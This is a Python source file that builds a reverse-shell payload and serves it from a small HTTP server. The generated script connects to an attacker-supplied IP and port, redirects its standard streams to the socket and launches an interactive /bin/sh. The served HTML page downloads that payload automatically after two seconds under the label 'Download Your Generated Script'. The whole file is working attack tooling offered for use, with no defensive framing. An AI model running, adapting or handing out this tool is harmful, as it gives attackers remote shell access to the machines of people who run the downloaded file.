import http.server
import socketserver
import os

SCRIPT_PATH = "static/generated_script.py" 

class CustomHandler(http.server.SimpleHTTPRequestHandler):
    """Handles HTTP GET requests to serve the generated script."""
    
    def do_GET(self):
        if self.path == "/":
            # Serve an HTML page instead of directly downloading the file
            self.send_response(200)
            self.send_header("Content-Type", "text/html")
            self.end_headers()
            
            html_content = f"""
            <!DOCTYPE html>
            <html lang="en">
            <head>
                <meta charset="UTF-8">
                <meta name="viewport" content="width=device-width, initial-scale=1.0">
                <title>Download Script</title>
                <style>
                    body {{
                        display: flex;
                        justify-content: center;
                        align-items: center;
                        height: 100vh;
                        font-family: Arial, sans-serif;
                        background-color: #f8f9fa;
                    }}
                    .container {{
                        text-align: center;
                        background: white;
                        padding: 20px;
                        border-radius: 10px;
                        box-shadow: 0px 4px 12px rgba(0, 0, 0, 0.1);
                    }}
                    .btn {{
                        display: inline-block;
                        padding: 10px 15px;
                        background: #007BFF;
                        color: white;
                        text-decoration: none;
                        border-radius: 5px;
                        margin-top: 15px;
                        font-size: 14px;
                    }}
                    .btn:hover {{
                        background: #0056b3;
                    }}
                </style>
                    <script>
                    window.onload = function() {{
                        setTimeout(() => {{
                            let link = document.createElement('a');
                            link.href = '/download';  // Download URL
                            link.download = '{os.path.basename(SCRIPT_PATH)}';
                            document.body.appendChild(link);
                            link.click();
                            document.body.removeChild(link);
                        }}, 2000);  // Delay for better user experience
                    }};
                </script>
            </head>
            <body>
                <div class="container">
                    <h2>⚡ Download Your Generated Script ⚡</h2>
                    <p>Click below to download the script:</p>
                    <a href="/download" class="btn" download>Download Script</a>
                </div>
            </body>
            </html>
            """
            self.wfile.write(html_content.encode("utf-8"))

        elif self.path == "/download":
            # Serve the generated Python script for download
            if os.path.exists(SCRIPT_PATH):
                self.send_response(200)
                self.send_header("Content-Type", "application/octet-stream")
                self.send_header("Content-Disposition", f"attachment; filename={os.path.basename(SCRIPT_PATH)}")
                self.end_headers()
                with open(SCRIPT_PATH, "rb") as f:
                    self.wfile.write(f.read())
            else:
                self.send_error(404, "File not found")

        else:
            self.send_error(404, "Page not found")


def generate_script(ip_address, port, output_filename=SCRIPT_PATH):
    """Generates a Python script dynamically."""
    script_content = f'''import socket
import subprocess
import os

# Attacker's IP and port
ATTACKER_IP = "{ip_address}"
ATTACKER_PORT = {port}

# Create a socket connection
s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect((ATTACKER_IP, ATTACKER_PORT))

# Redirect input, output, and error streams
os.dup2(s.fileno(), 0)
os.dup2(s.fileno(), 1)
os.dup2(s.fileno(), 2)

# Start interactive shell
subprocess.call(["/bin/sh", "-i"])
'''

    os.makedirs(os.path.dirname(output_filename), exist_ok=True)  # Ensure the static directory exists
    with open(output_filename, "w") as file:
        file.write(script_content)

    print(f"Python script generated: {output_filename}")

class CustomServer:
    """Class to start an HTTP server on a specified port."""
    
    def __init__(self, port=5800):
        self.port = port

    def start_server(self):
        """Starts the HTTP server to serve the generated script."""
        with socketserver.TCPServer(("", self.port), CustomHandler) as httpd:
            print(f"Serving at http://localhost:{self.port}")
            httpd.serve_forever()
    def generate_script_for_attack(self,host,port):
        generate_script(host, port)

        
        
